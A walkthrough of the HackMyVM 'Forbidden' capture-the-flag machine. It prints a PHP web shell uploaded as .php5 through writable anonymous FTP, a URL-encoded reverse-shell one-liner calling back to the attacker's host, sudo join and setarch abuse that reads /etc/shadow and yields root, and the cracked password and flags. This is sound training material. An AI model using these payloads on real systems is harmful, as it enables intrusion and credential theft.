# HackMyVM - Forbidden (Medium) Writeup

> **Platform:** HackMyVM  
> **Machine:** Forbidden  
> **Difficulty:** Medium  
> **Operating System:** Linux

---

## Introduction

Today we are going to solve another **HackMyVM** challenge which is a **Medium** rated Linux machine named **Forbidden**.

Unlike many other HackMyVM machines, this VM **does not display its IP address** on the challenge page. Therefore, our first objective is to identify the machine on the local network before beginning enumeration.

---

![Host Discovery](https://github.com/naval0505/HackMyVM/blob/0ece4675cbc4811c3cc5b55b749acb4fc1aa0ea0/Forbidden%20-%20HackMyVM%20Challenge%20Writeup/images/q1.png)

Since the machine IP is not provided, we begin by discovering active hosts on our local network using **Netdiscover**.

This quickly identifies the target machine without requiring manual network scanning.

---

![Target IP](https://github.com/naval0505/HackMyVM/blob/0ece4675cbc4811c3cc5b55b749acb4fc1aa0ea0/Forbidden%20-%20HackMyVM%20Challenge%20Writeup/images/q2.png)

After running Netdiscover we identify the target.

**Main IP ::**

```text
192.168.56.129
```

With the target identified, we begin our reconnaissance by performing a complete TCP port scan using **Nmap**.

```text
Nmap scan report for 192.168.56.129
Host is up, received arp-response (0.000078s latency).
Scanned at 2026-07-08 23:35:44 +1245 for 1s
Not shown: 65533 closed tcp ports (reset)

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64

MAC Address: 08:00:27:45:DD:5A (Oracle VirtualBox virtual NIC)
```

Only two ports are exposed:

- **21/tcp** → FTP
- **80/tcp** → HTTP

This significantly reduces the attack surface and tells us to focus our enumeration on these two services.

---

![Nmap Initial Scan](https://github.com/naval0505/HackMyVM/blob/0ece4675cbc4811c3cc5b55b749acb4fc1aa0ea0/Forbidden%20-%20HackMyVM%20Challenge%20Writeup/images/q3.png)

Next, we perform a service and version detection scan.

```text
Nmap scan report for 192.168.56.129
Host is up, received arp-response (0.00034s latency).
Scanned at 2026-07-08 23:37:02 +1245 for 7s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3

| ftp-syst:
| FTP server status:
| Connected to ::ffff:192.168.56.106
| Logged in as ftp
| TYPE: ASCII
| No session bandwidth limit
| Session timeout in seconds is 300
| Control connection is plain text
| Data connections will be plain text
| At session startup, client count was 3
| vsFTPd 3.0.3 - secure, fast, stable
|_End of status

| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Oct 09 2020 www

80/tcp open  http    syn-ack ttl 64 nginx 1.14.2

| http-methods:
|_ Supported Methods: GET HEAD

|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2

MAC Address: 08:00:27:45:DD:5A (Oracle VirtualBox virtual NIC)

Service Info: OS: Unix
```

### Interesting findings

- Anonymous FTP login is enabled.
- The anonymous user has access to a writable directory named **www**.
- The HTTP service is running **nginx 1.14.2**.
- Since FTP exposes a directory named **www**, there is a strong possibility that it maps directly to the web root.

This immediately becomes our primary attack vector.

---

![FTP Enumeration](https://github.com/naval0505/HackMyVM/blob/0ece4675cbc4811c3cc5b55b749acb4fc1aa0ea0/Forbidden%20-%20HackMyVM%20Challenge%20Writeup/images/q5.png)


We begin exploring the FTP service.

Since anonymous login is enabled, we connect directly without credentials.

Listing the available files reveals the following.

```text
150 Here comes the directory listing.

drwxrwxrwx    2 0        0            4096 Oct 09 2020 www

226 Directory send OK.

ftp> cd www

250 Directory successfully changed.

ftp> ls

229 Entering Extended Passive Mode (|||25245|)

150 Here comes the directory listing.

-rwxrwxrwx    1 0        0             241 Oct 09 2020 index.html
-rwxrwxrwx    1 0        0              75 Oct 09 2020 note.txt
-rwxrwxrwx    1 0        0              10 Oct 09 2020 robots.txt

226 Directory send OK.
```

The directory contains three files:

- index.html
- note.txt
- robots.txt

Since this directory is writable and resembles a web root, we download every available file for offline analysis.

---

![Downloaded Files](https://github.com/naval0505/HackMyVM/blob/0ece4675cbc4811c3cc5b55b749acb4fc1aa0ea0/Forbidden%20-%20HackMyVM%20Challenge%20Writeup/images/q6.png)

Inspecting the downloaded files reveals several useful hints.

### note.txt

```text
The extra-secured .jpg file contains my password but nobody can obtain it.
```

This immediately suggests that a **JPEG image somewhere on the server contains a password**.

---

### robots.txt

```text
/note.txt
```

Nothing particularly sensitive is hidden here.

---

### index.html

```html
<h1>SECURE WEB/FTP<h1>

Hi, Im the best admin of the world.

You cannot execute .php code on this server so you cannot
obtain a reverse shell.

Not sure if its misconfigured another things...
but the importart is that php is disabled.

-marta
```

Several important hints stand out.

- We now know a valid username:

```
marta
```

- The administrator explicitly claims PHP execution is disabled.
- Mentioning PHP like this usually indicates that bypassing the restriction will be part of the challenge.

Whenever a service claims something is impossible, it is often worth verifying that assumption.

---

![Directory Fuzzing](https://github.com/naval0505/HackMyVM/blob/0ece4675cbc4811c3cc5b55b749acb4fc1aa0ea0/Forbidden%20-%20HackMyVM%20Challenge%20Writeup/images/q7.png)

The note suggests that a **JPEG image contains Marta's password**.

We therefore enumerate the web server extensively looking for:

- JPG images
- Hidden files
- Additional directories
- Backup files
- Common extensions

Despite multiple enumeration attempts and fuzzing, nothing immediately exposes the referenced image.

Since web enumeration reaches a dead end, we return to the FTP service and investigate whether upload functionality can be abused.

---

![FTP Upload](https://github.com/naval0505/HackMyVM/blob/0ece4675cbc4811c3cc5b55b749acb4fc1aa0ea0/Forbidden%20-%20HackMyVM%20Challenge%20Writeup/images/q8.png)

The FTP directory is fully writable.

This means we can upload arbitrary files.

Even though the webpage claims PHP is disabled, we test multiple upload techniques using different PHP extensions to determine whether the server is incorrectly configured.

After experimenting with several payloads, one upload succeeds.

This indicates that while standard PHP execution may be blocked, alternative PHP extensions are still interpreted by the server.

This is a classic example of an **extension filtering bypass** caused by server misconfiguration.

---

![PHP5 Webshell](https://github.com/naval0505/HackMyVM/blob/0ece4675cbc4811c3cc5b55b749acb4fc1aa0ea0/Forbidden%20-%20HackMyVM%20Challenge%20Writeup/images/q9.png)

The payload that successfully executes is:

```php
<?php
echo shell_exec($_REQUEST['cmd']);
?>
```

Saved as:

```text
shel.php5
```

Instead of using the traditional **.php** extension, the file is uploaded as **.php5**.

The server executes it successfully, confirming that PHP itself is enabled but only certain extensions are blocked.

---

![Reverse Shell](https://github.com/naval0505/HackMyVM/blob/0ece4675cbc4811c3cc5b55b749acb4fc1aa0ea0/Forbidden%20-%20HackMyVM%20Challenge%20Writeup/images/q10.png)

Using the uploaded web shell, we execute a PHP reverse shell one-liner.

```text
http://192.168.56.129/shel.php5?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.56.106%22%2C4444%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

After starting a Netcat listener locally, the payload successfully connects back and provides a shell as:

```text
www-data
```

We now have initial access to the target.

---

As usual, the reverse shell is upgraded into a fully interactive TTY.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Suspend the shell.

```bash
Ctrl + Z
```

Configure the terminal.

```bash
stty raw -echo
fg
```

Finally,

```bash
export TERM=xterm
```

The shell is now stable and much easier to work with.

---

![Local Enumeration](https://github.com/naval0505/HackMyVM/blob/0ece4675cbc4811c3cc5b55b749acb4fc1aa0ea0/Forbidden%20-%20HackMyVM%20Challenge%20Writeup/images/q11.png)

After obtaining shell access, we begin local enumeration.

Browsing user directories reveals an interesting file inside **/home/marta**.

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
setuid(1001);
setgid(1001);
system("/bin/bash");
}
```

This appears to be a small privilege-related helper program.

We also discover another hidden file named:

```text
.forbidden
```

Initial inspection suggests it is a compiled binary.

Although interesting, neither artifact immediately leads to privilege escalation.

We continue searching elsewhere on the filesystem.

---

![Marta Password Discovery](https://github.com/naval0505/HackMyVM/blob/0ece4675cbc4811c3cc5b55b749acb4fc1aa0ea0/Forbidden%20-%20HackMyVM%20Challenge%20Writeup/images/q13.png)

Further filesystem enumeration reveals the file referenced earlier.

```text
/var/www/html/TOPSECRETIMAGE.jpg
```

The earlier hint stated:

> The extra-secured .jpg file contains my password.

The image filename itself turns out to be the password.

Using this password with the previously discovered username:

```text
marta
```

We successfully authenticate and obtain a shell as Marta.

---

# User Flag

As Marta, we first inspect sudo permissions.

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for marta on forbidden:

env_reset,
mail_badpass,
secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User marta may run the following commands on forbidden:

(ALL : ALL) NOPASSWD: /usr/bin/join
```

The **join** binary is allowed through sudo without a password.

Searching **GTFOBins** reveals an interesting file read primitive.

```bash
join -a 2 /dev/null /path/to/file
```

Using it:

```bash
sudo /usr/bin/join -a 2 /dev/null /root/root.txt
```

returns

```text
HMVmymymymymind
```

Likewise,

```bash
sudo /usr/bin/join -a 2 /dev/null /home/markos/user.txt
```

returns

```text
HMVpussycat
```

Although we can already read the root flag, we continue toward obtaining a full root shell.

---

![Sudo Join Abuse](https://github.com/naval0505/HackMyVM/blob/0ece4675cbc4811c3cc5b55b749acb4fc1aa0ea0/Forbidden%20-%20HackMyVM%20Challenge%20Writeup/images/q14.png)

Since arbitrary file reading is possible, we extract the shadow file.

```bash
sudo /usr/bin/join -a 2 /dev/null /etc/shadow
```

The password hashes are copied into a local file.

Using **John the Ripper**, one of the hashes is cracked successfully.

Recovered credentials:

```text
peter : boomer
```

---

![John Cracking Peter Password](https://github.com/naval0505/HackMyVM/blob/0ece4675cbc4811c3cc5b55b749acb4fc1aa0ea0/Forbidden%20-%20HackMyVM%20Challenge%20Writeup/images/q15.png)

Switching to the recovered account:

```bash
su peter
```

Checking sudo permissions.

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for peter on forbidden:

env_reset,
mail_badpass,
secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User peter may run the following commands on forbidden:

(ALL : ALL) NOPASSWD: /usr/bin/setarch
```

Again consulting GTFOBins reveals a straightforward privilege escalation technique.

Execute:

```bash
sudo /usr/bin/setarch -3 /bin/bash
```

This spawns a root shell immediately.

Verifying:

```bash
whoami
```

Output:

```text
root
```

Root access has now been successfully obtained.

---

![Root Shell via Setarch](https://github.com/naval0505/HackMyVM/blob/0ece4675cbc4811c3cc5b55b749acb4fc1aa0ea0/Forbidden%20-%20HackMyVM%20Challenge%20Writeup/images/q16.png)

At this point, both flags have been recovered.

### User Flag

```text
HMVpussycat
```

### Root Flag

```text
HMVmymymymymind
```

---

# Attack Path Summary

1. Discover target IP using Netdiscover.
2. Perform Nmap reconnaissance.
3. Enumerate anonymous FTP access.
4. Download exposed files.
5. Discover hints pointing toward Marta and a hidden JPG password.
6. Abuse writable FTP directory.
7. Upload a `.php5` web shell to bypass extension filtering.
8. Gain a reverse shell as **www-data**.
9. Stabilize the shell.
10. Enumerate local files and identify Marta's password source.
11. Switch to Marta.
12. Abuse `sudo join` to read arbitrary files.
13. Extract `/etc/shadow`.
14. Crack Peter's password using John the Ripper.
15. Switch to Peter.
16. Abuse `sudo setarch` via GTFOBins.
17. Obtain a full root shell.

---

# Key Takeaways

- Anonymous FTP access should never expose writable web directories.
- Blocking only the `.php` extension is ineffective if other executable PHP extensions remain enabled.
- User-provided hints can unintentionally leak valuable information during enumeration.
- Misconfigured sudo permissions are a frequent privilege escalation vector.
- GTFOBins remains an essential resource for identifying legitimate binaries that can be abused for privilege escalation.
- Arbitrary file read access can often be just as dangerous as arbitrary command execution, especially when sensitive files such as `/etc/shadow` are exposed.

---

# Machine Status

**User:** ✅ Captured

**Root:** ✅ Captured

**Machine:** Owned
